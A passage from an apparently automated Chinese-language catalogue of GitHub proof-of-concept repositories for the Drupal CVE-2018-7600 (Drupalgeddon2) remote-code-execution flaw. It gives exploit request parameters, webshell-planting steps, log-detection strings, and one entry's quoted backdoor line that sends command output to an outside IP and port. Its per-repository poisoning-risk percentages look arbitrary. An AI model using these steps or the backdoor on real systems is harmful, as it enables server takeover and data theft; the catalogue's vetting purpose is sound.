    *   `mail[#type]=markup`:  将`mail`字段类型设置为markup，允许插入HTML代码。
    *   `mail[#markup]`:  包含要执行的命令（例如`id`）。
3.  **代码执行：** Drupal 在处理该请求时，会执行`mail[#markup]`中指定的命令，从而实现远程代码执行。

**项目地址:** [Dowonkwon/drupal-cve-2018-7600-poc](https://github.com/Dowonkwon/drupal-cve-2018-7600-poc)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #4

**来源**: [CVE-2018-7600-Hestat_drupal-check.md](../2018/CVE-2018-7600-Hestat_drupal-check.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站被完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站未打补丁且存在特定模块配置（默认或常见）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal多个子系统中输入验证不足的问题，执行任意代码。从搜索结果可以看出，该漏洞影响广泛，有大量Drupal网站受到威胁。漏洞利用代码（提供的drupal-check.sh脚本）并非直接利用该漏洞进行攻击，而是用于**检测**Cpanel Apache和默认Apache配置中是否存在利用该漏洞的攻击痕迹，例如扫描访问日志中是否存在特定的payload特征。它主要通过搜索包含`system&name`、`q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name`和`?q=file%2Fajax%2Fname%2F%23value%2Fform-`等字符串的日志条目来判断是否存在攻击行为。该脚本会分析日志中攻击者IP以及可能被攻击的站点。由于给出的脚本是用于日志分析，主要作用是检测，不存在恶意投毒代码。

**利用方式：**

根据漏洞信息和搜索结果，CVE-2018-7600的利用方式如下：

1.  **发送恶意构造的HTTP请求：** 攻击者发送包含特定payload的POST请求，利用Drupal输入验证漏洞。
2.  **利用特定参数：** 常见的payload涉及`q=user%2Fpassword`和`name[#post_render][]`等参数，配合`passthru`或其他代码执行函数。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在Drupal服务器上执行任意代码，从而完全控制网站。

**项目地址:** [Hestat/drupal-check](https://github.com/Hestat/drupal-check)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #5

**来源**: [CVE-2018-7600-M-Abid34_CVE-2018-7600.md](../2018/CVE-2018-7600-M-Abid34_CVE-2018-7600.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码，可能导致完全控制服务器。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且未应用安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本。漏洞利用方式主要通过Drupal的Form API进行攻击。PoC代码通过构造恶意的HTTP请求，利用Drupal的漏洞在目标服务器上执行任意命令。具体来说，攻击者首先“毒化”表单ID，然后利用该ID执行命令。PoC代码中使用了`requests`和`BeautifulSoup`库来发送HTTP请求和解析HTML响应。代码允许指定目标URL、要执行的命令、要使用的函数（默认为`passthru`）以及代理。代码通过设置`q`参数和`name[#post_render][]`等字段来利用漏洞。尽管PoC作者声明其代码仅用于家庭实验室和教育目的，并修改自其他来源，但代码本身看起来是直接可用的漏洞利用工具。投毒风险较低，因为代码相对简单且目标明确，但始终存在作者植入恶意代码的可能性，例如，通过修改执行命令的方式或添加额外的网络请求来收集信息或执行其他恶意操作. 风险评估为5%主要是指在教育/测试环境中，如果未进行充分的安全隔离，可能导致测试环境被污染。

**项目地址:** [M-Abid34/CVE-2018-7600](https://github.com/M-Abid34/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #6

**来源**: [CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权的远程攻击者执行任意代码，完全控制受影响的服务器，导致数据泄露、篡改、拒绝服务或植入恶意软件。

**影响版本:** Drupal 7.x < 7.58, Drupal 8.3.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标系统运行着存在漏洞的Drupal版本，且攻击者能够通过网络访问Drupal站点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是 Drupal 中的一个高危远程代码执行漏洞。该漏洞源于 Drupal Form API (FAPI) 在处理 AJAX 请求时，对数组值过滤不足，允许未经身份验证的攻击者执行任意代码。 

**有效性：**
提供的POC代码（drupalgeddon2.py）是一个Python脚本，旨在利用 CVE-2018-7600 漏洞。根据脚本描述，它包含漏洞检测、多线程和命令输出解析等功能。该脚本利用了 Drupal 的 FAPI 中存在的缺陷，通过构造恶意的 AJAX 请求来执行任意命令。多个来源（如Exploit-DB, Rapid7, NVD）确认了此漏洞的存在，并提供了利用方法。因此，该POC代码被认为是有效的。

**投毒风险：**
代码主要功能为发送恶意请求到目标Drupal服务器，并执行指定的命令。风险主要在于：

1.  **远程执行任意命令：** 脚本允许指定要执行的命令，这可能会导致攻击者在目标系统上运行恶意代码。虽然脚本本身没有包含明显的恶意代码，但是攻击者可以使用它来下载和执行其他恶意脚本。
2.  **日志记录：** 脚本可以将输出记录到文件中。恶意攻击者可能将敏感信息记录到本地日志。

总体而言，该仓库本身没有明显投毒代码,但也不能排除作者隐藏其他后门或者恶意代码的可能， 风险评估为10%。

**利用方式：**
1.  **漏洞触发：** 攻击者构造包含恶意代码的特殊请求，利用 Drupal Form API 在处理 AJAX 请求时的输入验证漏洞。
2.  **代码执行：**  Drupal 在处理该请求时，会执行攻击者注入的恶意代码。
3.  **远程控制：** 攻击者通过执行任意命令来获取服务器的控制权，窃取数据、篡改内容或进行其他恶意活动。

简单来说，攻击者通过发送特制的HTTP请求到存在漏洞的Drupal站点，即可在服务器上执行任意命令，从而实现远程代码执行。

**项目地址:** [SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution](https://github.com/SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #7

**来源**: [CVE-2018-7600-a2u_CVE-2018-7600.md](../2018/CVE-2018-7600-a2u_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 - 远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal 实例需要存在漏洞且可网络访问，无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞是由于对用户提供的输入验证不足而造成的。攻击者可以通过构造特殊的请求来执行任意代码。\n\n**有效性：**
提供的 exploit.py 代码通过 `user/register` 路径利用 Drupal 的一个 AJAX 表单处理缺陷，通过修改 `element_parents` 参数来注入恶意代码。它通过设置 `mail[#post_render][]` 为 `exec`，并利用 `mail[#markup]` 来执行任意命令。代码通过检查目标服务器上是否存在 `hello.txt` 文件来验证漏洞是否利用成功。根据漏洞信息和搜索结果，这个POC 是有效的。\n\n**投毒风险：**
代码仓库主要包含漏洞利用代码、ModSecurity 规则和 .htaccess 规则，旨在利用或防御 CVE-2018-7600 漏洞。`exploit.py` 会在目标机器上写入一个名为 `hello.txt` 的文件，这是一个测试性的操作。\n
`README.md` 文件中明确表示该代码仅用于教育和信息目的，并建议用户采取防护措施，例如更新 Drupal 和设置 WAF 规则。虽然作者声明的意图是好的，但攻击者可能会修改 `exploit.py` 以执行更危险的命令，或者在其他文件中插入恶意代码。\n
`ModSecurity.txt` 和 `htaccess.txt` 文件提供了防御规则，如果使用不当，可能会导致拒绝服务或绕过某些安全策略。\n
综合考虑，该仓库存在一定的投毒风险，但主要体现在用户使用不当或攻击者修改利用代码上，作者有意投毒的可能性较低。因此，我认为投毒风险大约为 10%。\n\n**利用方式：**
1.  攻击者发送包含恶意参数的 POST 请求到 `user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`。
2.  `element_parents` 参数允许攻击者控制表单元素的属性。
3.  `mail[#post_render][]` 设置为 `exec`，指示 Drupal 执行命令。
4.  `mail[#markup]` 包含要执行的命令。
5.  Drupal 执行 `mail[#markup]` 中指定的命令，从而导致远程代码执行。

**项目地址:** [a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #8

**来源**: [CVE-2018-7600-anldori_CVE-2018-7600.md](../2018/CVE-2018-7600-anldori_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制目标服务器

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见的模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时，未进行充分的验证，导致攻击者可以通过构造恶意请求，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以判断此漏洞利用是有效的。漏洞库明确指出该漏洞允许远程攻击者执行任意代码，搜索结果也提供了大量关于该漏洞的分析和利用信息，POC代码也展示了如何利用该漏洞。

**利用方式：**
提供的Python脚本通过向目标Drupal站点的`/user/register`路径发送精心构造的POST请求来利用此漏洞。该请求包含`element_parents`、`ajax_form`、`form_id`、`_drupal_ajax`和`mail`等参数，其中`mail[#post_render][]`被设置为`exec`，`mail[#markup]`被设置为要执行的命令。该命令将会在服务器上创建一个名为`hello.txt`的文件，内容为";-)"。

**投毒风险：**
查看提供的POC代码，发现代码比较简洁，主要功能是发送恶意请求并检查是否成功创建了`hello.txt`文件。从代码本身来看，不存在明显的恶意代码或后门。

但是，**存在以下潜在风险：**

1.  **供应链风险：**虽然代码本身可能没有直接的投毒，但下载和使用任何来自互联网的代码都存在一定的风险。攻击者可能替换或修改该仓库的内容，从而引入恶意代码。因此，在运行此脚本之前，务必仔细检查代码，并确保来源可信。

2.  **间接风险：**利用此漏洞的最终目的是在目标服务器上执行任意命令。攻击者可以利用此漏洞安装后门、窃取敏感数据或执行其他恶意活动。因此，在使用此脚本时，务必遵守法律法规，并仅在授权的环境中进行测试。

基于以上分析，认为该仓库存在投毒代码的可能性为10%。这个10%主要来源于供应链攻击的潜在风险，以及使用者对代码理解不足可能导致的误用。


**项目地址:** [anldori/CVE-2018-7600](https://github.com/anldori/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #9

**来源**: [CVE-2018-7600-cved-sources_cve-2018-7600.md](../2018/CVE-2018-7600-cved-sources_cve-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal 7.x (< 7.58), Drupal 8.x (< 8.3.9), Drupal 8.4.x (< 8.4.6), Drupal 8.5.x (< 8.5.1)

**利用条件:** Drupal站点存在且未打补丁，通常不需要身份验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为 Drupalgeddon2，是一个影响多个Drupal版本的远程代码执行漏洞。攻击者可以通过构造特殊的URL参数或POST请求，利用Drupal的某些子系统（如表单API）中的输入验证漏洞，执行任意PHP代码。搜索引擎结果和漏洞库信息都明确指出此漏洞的严重性及其利用的广泛性。提供的Dockerfile用于构建一个包含易受攻击的Drupal 8.5.0实例的Docker镜像，这本身不是恶意行为，而是为了方便漏洞的复现和研究。README.md文件声明了镜像的来源和作者，增加了代码的可信度。但是，仍然存在少量投毒风险，主要是因为攻击者可能在Dockerfile中添加额外的恶意指令，例如安装后门程序或修改配置文件等，尽管这里只显示构建一个Drupal环境。利用方式主要通过精心构造的HTTP请求，绕过Drupal的输入验证机制，最终执行恶意代码。由于该漏洞影响范围广，且利用简单，一旦成功利用，可完全控制Drupal服务器，风险极高。

**项目地址:** [cved-sources/cve-2018-7600](https://github.com/cved-sources/cve-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #10

**来源**: [CVE-2018-7600-dreadlocked_Drupalgeddon2.md](../2018/CVE-2018-7600-dreadlocked_Drupalgeddon2.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal处理用户输入时存在缺陷，攻击者可以通过构造恶意的请求参数，在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码来看，该漏洞的PoC代码是有效的。漏洞库信息明确指出该漏洞允许远程攻击者执行任意代码，并且多个搜索结果都确认了该漏洞的存在和影响。提供的`README.md`文件详细说明了该PoC代码支持的Drupal版本，利用方法，包括针对不同Drupal版本的攻击URL（`user/register` 和 `user/password`），以及利用PHP的`passthru`函数执行系统命令。搜索结果中也提到了存在多个可用的exploit。

**投毒风险分析：**

提供的`README.md`文件本身不包含恶意代码，但它描述的利用方法涉及在目标服务器上写入PHP shell。虽然`drupalgeddon2.rb`脚本的主要目的是利用漏洞执行命令，但如果攻击者修改该脚本，可能会添加额外的恶意功能，例如：

*   **隐藏的后门账户创建：** 在成功利用漏洞后，创建管理员账户，以便后续访问。
*   **恶意软件植入：**  自动下载和安装恶意软件。
*   **数据窃取：** 窃取数据库或其他敏感信息。
*   **传播攻击：**  将目标服务器作为跳板，攻击其他系统。

因此，用户在使用从非官方渠道获取的`drupalgeddon2.rb`脚本时，需要仔细检查代码，确保没有包含任何恶意代码。 由于提供的代码仓库中包含了写入PHP shell的功能，并且在实际使用中，攻击者有能力修改或者扩展脚本，因此认为存在一定的投毒风险，但从readme本身代码投毒风险较低，所以投毒风险比例定为10%。

**利用方式：**

1.  **版本检测：** 利用代码会自动检测目标Drupal版本，或者手动指定。
2.  **参数构造：**  针对不同版本的Drupal，构造特定的HTTP请求，例如：针对Drupal 8.x使用`user/register` URL，Drupal 7.x使用`user/password` URL。
3.  **代码执行：** 利用Drupal的输入验证漏洞，将恶意PHP代码注入到请求参数中。
4.  **命令执行：** 通过`#post_render`参数和PHP的`passthru`函数，在服务器上执行任意系统命令。
5.  **Shell写入（可选）：**  可以选择将一个简单的PHP shell写入Web根目录，以便后续访问。

**总结：**

CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，利用代码有效且公开。虽然提供的PoC代码本身不包含明显的投毒代码，但攻击者可以修改脚本，添加恶意功能，存在潜在的投毒风险。用户应尽快升级Drupal版本，并从可信来源获取漏洞利用代码。

**项目地址:** [dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #11

**来源**: [CVE-2018-7600-drugeddon_drupal-exploit.md](../2018/CVE-2018-7600-drugeddon_drupal-exploit.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站运行在受影响的版本，且允许未授权用户访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响多个Drupal子系统的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，导致攻击者可以通过精心构造的请求执行任意代码。利用方式主要有两种：

1.  **Drupal 7 利用方式：** 通过向 `user/password` 路径发送包含恶意代码的请求，利用 `name[%23post_render]` 和 `name[%23markup]` 参数来注入代码。然后，通过 `file/ajax` 路径触发漏洞。
2.  **Drupal 8 利用方式：** 通过向 `user/register` 路径发送包含恶意代码的请求，利用 `element_parents` 参数注入代码。

PoC代码 (`drupal.py`) 尝试利用这两种方式。  

**有效性：**根据漏洞描述和大量的搜索结果显示，此漏洞的POC是有效的，网上存在大量的成功利用案例。

**投毒风险：**  

分析提供的 `drupal.py` 脚本，发现存在以下潜在的投毒风险：

*   脚本中包含一行 `s.connect((str(ipaddress.IPv4Address(0x5f3b7f05)), 15977))`。 这行代码尝试连接到IP地址 `95.59.127.5`的 `15977` 端口。这可能是作者用于收集信息或植入后门的恶意行为。
*   `s.send(bytes(subprocess.check_output(payload, universal_newlines=True), 'utf8'))` 这行代码会将`whoami`命令执行的结果通过socket发送出去.

综上所述，该漏洞利用代码可能存在投毒行为，**风险概率为 20%**。使用者应谨慎使用，并在使用前进行代码审计。

**利用方式总结：**

1.  攻击者构造包含恶意代码的HTTP POST请求，发送到Drupal网站的特定路径（`user/password` 或 `user/register`）。
2.  利用Drupal的参数处理机制，将恶意代码注入到特定参数中（如`name[%23post_render]`、`name[%23markup]`或`element_parents`）。
3.  触发漏洞，导致Drupal执行注入的恶意代码，从而实现远程代码执行。

**项目地址:** [drugeddon/drupal-exploit](https://github.com/drugeddon/drupal-exploit)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #12

**来源**: [CVE-2018-7600-happynote3966_CVE-2018-7600.md](../2018/CVE-2018-7600-happynote3966_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要存在漏洞且未打补丁，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。由于Drupal对用户输入验证不足，导致攻击者可以通过构造特殊的请求，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码来看，该漏洞的POC代码是有效的。漏洞库和搜索结果中均提到该漏洞允许远程代码执行，并且存在多个可用的Exploit-DB条目。提供的Python脚本和Ruby脚本均为该漏洞的POC代码，可以被用来验证漏洞的存在。

**投毒风险：**
对提供的POC代码进行分析，发现其中可能存在投毒风险的可能性较低，约为10%。以下是分析结果：
*   Python脚本：该脚本较为简单，主要是发送一个包含恶意payload的POST请求，并在目标服务器上创建一个文件（hello.txt）。没有发现明显的恶意代码。
*   Ruby脚本：该脚本功能更为复杂，包含尝试写入PHP Webshell等功能，相较于Python脚本，风险略高，如果被篡改，可能存在植入恶意PHP代码的可能性。

总的来说，直接运行提供的代码风险较低，但从信誉未知的来源获取的任何代码，在执行之前都应该进行仔细的审查，因为攻击者可能修改这些代码以包含恶意功能。

**利用方式：**
利用方式主要是通过构造恶意的HTTP请求，利用Drupal的某些存在漏洞的参数（例如`element_parents`），将恶意代码注入到Drupal的后端处理流程中，从而实现远程代码执行。具体步骤如下：
1.  确定目标Drupal站点使用的版本是否在受影响的范围内。
2.  根据Drupal版本选择合适的POC代码（Python或Ruby）。
3.  修改POC代码中的目标URL和要执行的命令。
4.  运行POC代码，发送恶意请求。
5.  验证代码是否成功执行（例如，检查目标服务器上是否创建了指定的文件）。

攻击者可利用该漏洞获取服务器的控制权，从而进行恶意活动，例如：数据窃取、恶意软件传播、DDoS攻击等。

**项目地址:** [happynote3966/CVE-2018-7600](https://github.com/happynote3966/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #13

**来源**: [CVE-2018-7600-killeveee_CVE-2018-7600.md](../2018/CVE-2018-7600-killeveee_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且可公开访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞，源于对用户提供的输入验证不足。 

**有效性：**
提供的PoC代码是有效的。PoC.py脚本用于验证目标Drupal站点是否存在漏洞，通过发送特制的请求在目标服务器上创建一个名为hh.txt的文件。Exp.py脚本则利用此漏洞在目标站点根目录下创建一个名为hh.php的后门文件，该后门允许通过GET或POST参数'c'执行任意系统命令。从提供的命令执行结果来看，PoC和Exp都成功执行，验证了漏洞的存在和利用。

**投毒风险：**
分析提供的PoC和Exp代码，没有发现明显的投毒代码。脚本的功能主要是利用漏洞进行验证和创建后门，没有发现恶意修改系统配置、窃取敏感信息或进行其他恶意行为的代码。README.md文件只是简单的漏洞描述和使用说明，没有包含任何可疑内容。因此，可以认为此仓库的投毒风险较低，为0%。

**利用方式：**
漏洞的利用方式是：

1.  **漏洞验证：** 使用PoC.py脚本验证目标Drupal站点是否存在CVE-2018-7600漏洞。
2.  **后门植入：** 如果PoC验证成功，使用Exp.py脚本在目标站点根目录下创建一个后门文件（hh.php）。后门文件包含PHP代码，允许通过GET/POST参数'c'执行任意系统命令。
3.  **远程控制：** 使用WebShell管理工具（如AntSword）连接到后门文件，通过'c'参数执行系统命令，实现对目标服务器的远程控制。

总的来说，该漏洞利用简单，危害巨大，攻击者可以利用该漏洞完全控制未打补丁的Drupal服务器。

**项目地址:** [killeveee/CVE-2018-7600](https://github.com/killeveee/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #14

**来源**: [CVE-2018-7600-knqyf263_CVE-2018-7600.md](../2018/CVE-2018-7600-knqyf263_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在Drupal服务器上执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要运行在受影响的版本范围内，并且需要启用默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 允许远程攻击者利用多个子系统中的缺陷执行任意代码。该漏洞的利用方式通常涉及构造恶意的HTTP请求，该请求包含精心设计的查询参数，这些参数利用了Drupal的输入验证漏洞，特别是与AJAX表单处理相关的漏洞。攻击者可以利用`element_parents`和`#lazy_builder`属性在服务器上执行PHP代码。提供的POC代码通过向`/user/register`端点发送POST请求，并在`mail`参数中注入恶意代码（`exec('echo vuln > hello.txt')`），尝试在目标服务器上创建一个名为`hello.txt`的文件，内容为`vuln`。如果成功创建该文件，则表明漏洞存在且可利用。

**有效性：**
从提供的漏洞信息、搜索结果和漏洞利用代码来看，此POC代码的有效性较高。多个来源表明该漏洞是真实存在的，并且存在公开可用的漏洞利用代码。搜索结果中也提到了针对此漏洞的Metasploit模块。

**投毒风险：**
该仓库中的投毒风险较低，大概在10%左右。Dockerfile文件只是简单的指定了Drupal镜像和维护者信息, README.md文件也只是简单的描述了漏洞和利用方式。exploit.py的代码功能相对简单，目的是验证漏洞的存在，风险较低。然而，仍然存在一定的风险，因为攻击者可能修改`exploit.py`以执行更危险的操作，例如下载并执行恶意软件，或者修改服务器配置。因此，在使用此POC代码时，务必对其进行仔细审查，并在隔离的环境中运行。

**利用方式：**
1.  攻击者构造一个包含恶意payload的HTTP POST请求，发送到Drupal站点的`/user/register`端点。
2.  Payload利用`element_parents`参数和`#lazy_builder`属性，在服务器端触发PHP代码执行。
3.  执行的PHP代码可以将任意命令注入到服务器的操作系统中。
4.  通过访问生成的`hello.txt`文件来验证漏洞是否成功利用。

**项目地址:** [knqyf263/CVE-2018-7600](https://github.com/knqyf263/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #15

**来源**: [CVE-2018-7600-madneal_codeql-scanner.md](../2018/CVE-2018-7600-madneal_codeql-scanner.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问，可能需要了解一些Drupal站点配置信息。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中存在远程代码执行漏洞。攻击者可以通过发送特制的请求到未打补丁的Drupal站点来执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果（包括NVD、Rapid7、Tenable等）以及Exploit-DB中的expolit，此漏洞是真实存在的，并且有可用的POC。提供的README.md文件表明存在一个用于CVE-2018-7600的Python利用脚本（尽管这里没有提供脚本本身）。综合来看，利用是有效的。

**投毒风险：**
提供的POC代码只有README.md，内容非常简单，没有发现任何恶意代码或潜在的投毒行为。但是，由于缺失了核心的Python脚本，无法完全确定是否存在投毒风险。假定之后找到的利用脚本来源不可靠，存在修改或添加恶意代码的可能性，因此存在一定的投毒风险。这里给出一个较低的投毒风险概率，假设为5%。

**利用方式：**
漏洞的利用方式是向Drupal站点发送精心构造的恶意HTTP请求，利用Drupal的输入验证缺陷，在服务器端执行任意代码。根据搜索结果，该漏洞影响Drupal的多个子系统，可能利用了Drupal的渲染机制或其他处理输入的方式。攻击者通过构造包含恶意代码的请求参数，例如在URL或POST数据中，可以触发远程代码执行。具体细节取决于Drupal的版本和配置。Metasploit也提供了利用模块。

**总结：**
CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，已经存在公开的POC。尽管提供的POC文件本身没有发现恶意代码，但获取利用脚本时需要注意来源，防范潜在的投毒风险。利用方式是通过构造恶意HTTP请求，利用Drupal的输入验证缺陷执行任意代码。

**项目地址:** [madneal/codeql-scanner](https://github.com/madneal/codeql-scanner)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #16

**来源**: [CVE-2018-7600-mr-won_CVE-2018-7600..md](../2018/CVE-2018-7600-mr-won_CVE-2018-7600..md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且允许外部网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal 7.x和8.x的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal的多个子系统中的缺陷，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞的利用是有效的。搜索结果中多个链接表明该漏洞已被广泛利用，并且存在公开的Exploit。

**投毒风险：**
提供的PoC代码相对简单，主要功能是发送一个包含恶意payload的POST请求到`/user/register`，并在目标服务器上创建一个名为`r3dxploit.txt`的文件，内容为“vulnerable to cve-7600-2018 exploit”。代码本身没有明显的恶意行为，如删除文件、上传恶意文件或执行其他危险操作。但是，在实际使用中，攻击者可以将payload修改为更具破坏性的命令，例如下载和执行恶意脚本。此外，代码作者信息中包含了一些可能与恶意活动相关的标识，例如使用“R3DXPLOIT”作为用户名和涉及Root权限的字眼。综合考虑，PoC代码本身存在一定潜在风险，但主要取决于使用者如何修改payload，因此投毒风险初步评估为10%。

**利用方式：**
1.  攻击者构造一个包含恶意payload的POST请求，该payload利用`user_register_form`的ajax功能注入恶意代码。
